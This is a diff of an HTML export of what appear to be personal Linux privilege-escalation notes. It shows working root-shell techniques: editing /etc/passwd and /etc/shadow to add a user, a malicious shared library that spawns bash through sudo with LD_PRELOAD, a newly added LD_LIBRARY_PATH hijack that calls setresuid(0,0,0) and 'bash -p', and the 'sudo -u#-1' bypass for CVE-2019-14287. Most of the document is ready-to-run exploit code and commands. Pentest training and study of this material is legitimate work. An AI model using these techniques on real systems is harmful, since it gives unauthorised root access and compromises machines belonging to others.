@@ -672,8 +672,8 @@ blockquote {
 </p><p id="0f49791b-ae30-41d6-bd05-eff4cefd2a6e" class="">Edit /etc/passwd</p><pre id="31fd6984-e505-4a76-92e6-983fad3186b6" class="code"><code>openssl passwd mypass
 add to /etc/shadow
 add user in /etc/passwd
-try to ssh</code></pre><h3 id="a49a2525-9d9c-464e-800f-5535b18b7281" class="">CVE Exploits</h3><pre id="8edbdb3e-24d1-4d2b-a542-c7cec17aa739" class="code"><code>sudo -V</code></pre><p id="e17dcf9c-d026-4b67-9a2f-76a0fb92289b" class="">LD-Preload:
-sudo -l -&gt; youll see env_keep+=LD_PRELOAD</p><p id="e0b39bf0-0815-4f0e-b181-a89735ffb667" class="">Shell.c</p><pre id="b752fdf6-2593-47f3-b4e0-b968544bb8cf" class="code code-wrap"><code>#include &lt;stdio.h&gt;
+try to ssh</code></pre><h3 id="a49a2525-9d9c-464e-800f-5535b18b7281" class="">CVE Exploits</h3><pre id="8edbdb3e-24d1-4d2b-a542-c7cec17aa739" class="code"><code>sudo -V</code></pre><p id="e17dcf9c-d026-4b67-9a2f-76a0fb92289b" class=""><strong>LD-Preload:
+</strong>sudo -l -&gt; you’ll see env_keep+=LD_PRELOAD</p><p id="e0b39bf0-0815-4f0e-b181-a89735ffb667" class="">Shell.c</p><pre id="b752fdf6-2593-47f3-b4e0-b968544bb8cf" class="code code-wrap"><code>#include &lt;stdio.h&gt;
 #include &lt;sys/types.h&gt;
 #include &lt;stdlib.h&gt;
 
@@ -686,9 +686,22 @@ system(&quot;/bin/bash&quot;)
 }
 
 gcc -fPIC -shared -o shell.so shell.c
-</code></pre><pre id="c4d33608-4f23-404c-8cb8-44ac286a2680" class="code code-wrap"><code>sudo LD_PRELOAD=/home/user/shell.so apache2
-</code></pre><p id="7a870968-1b03-471c-aa64-059ae04d8195" class="">
-</p><p id="7848fac1-60c9-4223-927e-1f3ed38fcdd6" class=""><strong>CVE-2019-14287</strong></p><p id="1d3c9aca-6475-4aa5-99df-01905268f8f6" class=""><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p><pre id="5139f7ab-619d-4ad7-91a1-652c7d2ec220" class="code"><code>sudo -u#-1 /bin/bash</code></pre><p id="c9774dc9-679d-4760-912d-e50bc7040956" class="">
+</code></pre><pre id="c4d33608-4f23-404c-8cb8-44ac286a2680" class="code code-wrap"><code>sudo LD_PRELOAD=/home/user/shell.so apache2</code></pre><p id="7a870968-1b03-471c-aa64-059ae04d8195" class="">
+</p><p id="7fa5a422-c1f6-4c46-8458-2c994089ce79" class="">
+</p><p id="940c0c44-695e-4c20-aef4-ba31afe122d3" class=""><strong>LD-Library Path:</strong></p><ul id="58af6636-b439-49aa-946e-d953c8334bbd" class="bulleted-list"><li style="list-style-type:disc">ldd /path/to/program</li></ul><ul id="043576d3-47ef-4a50-8e22-63816a12adf5" class="bulleted-list"><li style="list-style-type:disc">pick outputted library to replace</li></ul><pre id="3f04f3ee-a25b-4921-9d63-15bb3a2b3bfe" class="code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv(&quot;LD_LIBRARY_PATH&quot;);
+	setresuid(0,0,0);
+	system(&quot;/bin/bash -p&quot;);
+
+}
+gcc -fPIC -shared -o shell.so shell.c
+sudo LD_LIBRARY_PATH=. /path/to/program
+</code></pre><p id="7848fac1-60c9-4223-927e-1f3ed38fcdd6" class=""><strong>CVE-2019-14287</strong></p><p id="1d3c9aca-6475-4aa5-99df-01905268f8f6" class=""><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p><pre id="5139f7ab-619d-4ad7-91a1-652c7d2ec220" class="code"><code>sudo -u#-1 /bin/bash</code></pre><p id="c9774dc9-679d-4760-912d-e50bc7040956" class="">
 </p><p id="d4fd5cfe-c9fc-4084-986d-2b4a73cc85e7" class=""><strong>CVE-2019-18634</strong></p><p id="549861ef-9da1-4d05-9292-048709be0ad1" class=""><a href="https://github.com/saleemrashid/sudo-cve-2019-18634">https://github.com/saleemrashid/sudo-cve-2019-18634</a></p><p id="65b010ca-c9ce-4bb2-9b30-f9df377b5e52" class="">
 </p><p id="dad34acf-c250-4012-b64d-50c08f32e3dd" class="">vulnerability in pwfeedback → This is feedback **** when you enter a string in sudo password. Must be enabled.</p><pre id="e4473301-b6b7-4f91-8fb1-b324e78cd3fb" class="code"><code>#Check for sudo versions before 1.8.26
 sudo -V </code></pre><p id="30a3627e-3cdf-4ca6-8827-9fc073c5b9bc" class="">
